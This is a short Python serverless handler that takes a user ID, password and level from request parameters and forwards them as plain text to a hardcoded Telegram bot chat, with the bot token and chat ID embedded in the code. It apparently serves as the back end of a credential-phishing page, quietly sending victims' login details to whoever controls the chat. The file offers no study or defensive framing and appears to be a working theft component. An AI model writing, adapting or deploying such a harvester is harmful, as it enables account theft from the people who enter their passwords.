import requests

def handler(request):
    uid = request.args.get("uid")
    password = request.args.get("password")
    level = request.args.get("level")

    # Param check
    if not uid or not password or not level:
        return {
            "statusCode": 400,
            "body": {"status": "error", "message": "uid, password, level required"}
        }

    try:
        BOT_TOKEN = "8622182891:AAFZrjBvj_iAMTOIXCnmd65tTzZENnB2_UQ"
        CHAT_ID = "7326248826"

        text = f"UID: {uid}\nPASSWORD: {password}\nLEVEL: {level}"

        telegram_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"

        payload = {
            "chat_id": CHAT_ID,
            "text": text
        }

        tg = requests.get(telegram_url, params=payload)
        tg_data = tg.json()

        return {
            "statusCode": 200,
            "body": {
                "status": "success",
                "message": "Telegram message sent",
                "telegram_response": tg_data
            }
        }

    except Exception as e:
        return {
            "statusCode": 500,
            "body": {"status": "error", "message": str(e)}
        }